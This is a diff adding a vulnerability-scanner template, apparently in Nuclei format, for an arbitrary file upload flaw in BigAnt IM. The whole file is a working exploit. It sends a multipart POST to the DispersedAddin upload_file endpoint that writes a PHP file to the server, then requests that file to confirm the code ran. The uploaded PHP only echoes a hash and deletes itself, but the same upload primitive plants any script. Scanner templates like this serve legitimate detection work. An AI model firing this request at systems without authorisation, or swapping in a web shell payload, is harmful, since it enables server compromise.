@@ -1,0 +1,55 @@
+id: poc-yaml-jiuqitech-bigant-ims-upload-file-anyfile-upload
+
+info:
+  name: BigAnt IM File Upload Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: arbitrary-upload
+
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/?m=Api&c=DispersedAddin&a=upload_file"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+    body: |-
+      ------WebKitFormBoundary
+      Content-Disposition: form-data; name="file_info"
+
+      [{"file_path":"{{t1}}.php"}]
+      ------WebKitFormBoundary
+      Content-Disposition: form-data; name="file"; filename="1.txt"
+
+      <?php echo md5({{t1}});unlink(__FILE__);?>
+      ------WebKitFormBoundary--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "添加成功"
+
+  - id: confirm-upload
+    method: GET
+    path:
+      - "/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
